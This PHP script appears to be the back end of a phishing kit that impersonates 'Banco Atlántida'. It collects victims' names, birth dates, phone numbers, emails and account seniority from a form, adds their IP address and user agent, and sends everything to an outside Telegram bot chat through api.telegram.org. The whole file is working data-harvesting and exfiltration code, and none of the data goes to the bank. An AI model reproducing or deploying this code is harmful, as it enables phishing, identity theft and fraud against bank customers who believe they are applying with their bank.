<?php
header('Content-Type: application/json; charset=UTF-8');

require_once __DIR__ . '/data.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

// IP del visitante
$ip = '';
foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$ip   = $ip ?: '?';
$date = date('d/m/Y H:i:s');
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';

// Datos del formulario
$nombres    = trim($_POST['nombres']    ?? '');
$apellidos  = trim($_POST['apellidos']  ?? '');
$fechaNac   = trim($_POST['fechaNac']   ?? '');
$phone      = trim($_POST['phone']      ?? '');
$email      = trim($_POST['email']      ?? '');
$antiguedad = trim($_POST['antiguedad'] ?? '');

// Construir mensaje
$msg  = "🏦 <b>NUEVA SOLICITUD — BANCO ATLÁNTIDA</b>\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "👤 <b>Nombre:</b> " . htmlspecialchars($nombres . ' ' . $apellidos) . "\n";
$msg .= "🎂 <b>Fecha Nac.:</b> " . htmlspecialchars($fechaNac) . "\n";
$msg .= "📱 <b>Teléfono:</b> " . htmlspecialchars($phone) . "\n";
$msg .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
$msg .= "🏛️ <b>Antigüedad:</b> " . htmlspecialchars($antiguedad) . "\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "🌐 <b>IP:</b> {$ip}\n";
$msg .= "🕒 <b>Fecha:</b> {$date}\n";
$msg .= "📲 <b>UA:</b> " . mb_substr($ua, 0, 80) . "\n";

// Enviar a Telegram
$url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
$ch  = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_POSTFIELDS     => [
        'chat_id'    => $chat_id,
        'text'       => $msg,
        'parse_mode' => 'HTML',
    ],
]);
$resp   = curl_exec($ch);
$err    = curl_error($ch);
curl_close($ch);

if ($err) {
    echo json_encode(['ok' => false, 'error' => $err]);
    exit;
}

echo json_encode(['ok' => true]);
